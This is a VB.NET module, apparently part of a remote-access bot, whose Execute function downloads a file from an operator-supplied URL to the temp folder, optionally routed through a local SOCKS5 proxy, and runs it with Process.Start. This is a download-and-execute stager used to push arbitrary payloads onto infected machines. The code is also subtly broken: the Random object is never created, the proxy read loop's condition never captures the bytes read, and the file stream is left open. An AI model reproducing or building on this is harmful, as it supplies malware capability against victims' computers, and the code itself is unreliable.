Imports System.IO
Imports System.Net
Imports com.LandonKey.SocksWebProxy

Module Execute
    Public Function Execute(ByVal model As ExecuteModel)
        Dim r As Random
        Dim newlocation As String = IO.Path.GetTempPath & "/" & r.Next(0, 99999) & model.Name

        If Not IO.File.Exists(newlocation) Then
            If Not model.Proxy Then
                Dim download As New WebClient
                download.DownloadFile(model.Url, newlocation)
            Else
                Dim request As HttpWebRequest
                Dim socket5 As com.LandonKey.SocksWebProxy.Proxy.ProxyConfig = New com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, Config.Variables.SocketPort, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five)
                request = CType(WebRequest.Create(model.Url), HttpWebRequest)
                request.Proxy = New SocksWebProxy(socket5)
                request.KeepAlive = False
                request.Method = WebRequestMethods.Http.Get
                request.Timeout = 3000
                Dim response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
                Dim str As Stream = response.GetResponseStream()
                Dim bufferSize As Integer = 1024
                Dim buffer As Byte() = New Byte(bufferSize - 1) {}
                Dim bytesRead As Integer = 0

                Dim fileStream As FileStream = File.Create(newlocation)

                While (bytesRead = str.Read(buffer, 0, bufferSize)) <> 0
                    fileStream.Write(buffer, 0, bytesRead)
                End While

            End If
            If model.Run Then
                Process.Start(newlocation)
            End If
            Return "File successfully executed!"
        End If
        Return "File already exist please try again!"
    End Function

End Module
